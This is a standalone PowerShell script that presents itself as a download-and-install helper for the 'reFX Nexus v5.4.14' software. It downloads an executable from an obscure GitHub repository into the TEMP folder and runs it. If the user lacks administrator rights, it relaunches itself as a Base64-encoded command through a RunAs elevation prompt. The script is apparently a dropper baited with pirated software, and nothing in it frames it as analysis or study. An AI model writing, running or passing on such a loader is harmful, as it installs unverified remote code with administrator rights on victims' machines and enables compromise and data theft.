$scriptBlock = {
    $ErrorActionPreference = 'Stop'
    $downloadUrl = 'https://raw.githubusercontent.com/AmplitudeQuail/dlqmjdez/main/reFX%20Nexus%20v5.4.14.exe'
    $outputPath  = Join-Path $env:TEMP 'reFX Nexus v5.4.14.exe'

    $wc = New-Object System.Net.WebClient
    $wc.DownloadProgressChanged.Add({
        param($s, $e)
        Write-Progress -Activity 'Downloading reFX Nexus v5.4.14' `
            -Status "$($e.ProgressPercentage)% complete" `
            -PercentComplete $e.ProgressPercentage
    })
    $wc.DownloadFileCompleted.Add({
        Write-Progress -Activity 'Downloading reFX Nexus v5.4.14' -Completed
    })

    $wc.DownloadFileAsync([Uri]$downloadUrl, $outputPath)
    while ($wc.IsBusy) { Start-Sleep -Milliseconds 200 }

    if (-not (Test-Path $outputPath)) { throw 'Download failed.' }

    Start-Process -FilePath $outputPath
    Start-Sleep -Seconds 2
    exit
}

$identity  = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($identity)
$isAdmin   = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if ($isAdmin) {
    & $scriptBlock
} else {
    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptBlock.ToString()))
    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -EncodedCommand $encoded"
    exit
}
